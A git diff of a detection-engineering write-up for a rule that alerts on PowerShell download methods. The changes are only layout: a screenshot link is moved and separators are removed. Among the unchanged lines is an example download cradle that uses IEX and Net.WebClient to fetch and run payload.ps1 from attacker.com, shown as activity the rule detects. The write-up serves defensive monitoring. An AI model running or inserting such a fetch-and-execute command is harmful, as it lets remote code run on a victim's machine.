@@ -40,7 +40,7 @@ This search looks for common PowerShell download methods:
 | **Throttle Duration** : 15 minutes
 | **Severity** : High
 
-## Test Procedure   [Powershell Command](./screenshots/Command-Line.png)
+## Test Procedure   
 
 ```powershell
 # Downloads Google homepage
@@ -50,6 +50,7 @@ Invoke-WebRequest -Uri "https://www.google.com" -OutFile "test.html"
 Remove-Item test.html -ErrorAction SilentlyContinue
 ```
 
+[Powershell Command](./screenshots/Command-Line.png)
 
 **What gets logged:**  
 PowerShell Script Block (Event ID 4104) captures the full `Invoke-WebRequest` command with the URL and parameters.
@@ -80,16 +81,12 @@ IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
 - Throttling prevents duplicate alerts from same user
 - Both legitimate and malicious downloads detected
 
----
-
 ## Screenshots
 
 - [Alert Details](./screenshots/01-alert-details.png)
 - [Alert Triggered](./screenshots/02-alert-triggered.png)
 - [Search Results with Download Command](./screenshots/03-search-results.png)
 - [Raw Event Log](./screenshots/04-event-log.png)
-
----
 
 ## Investigation Steps
 
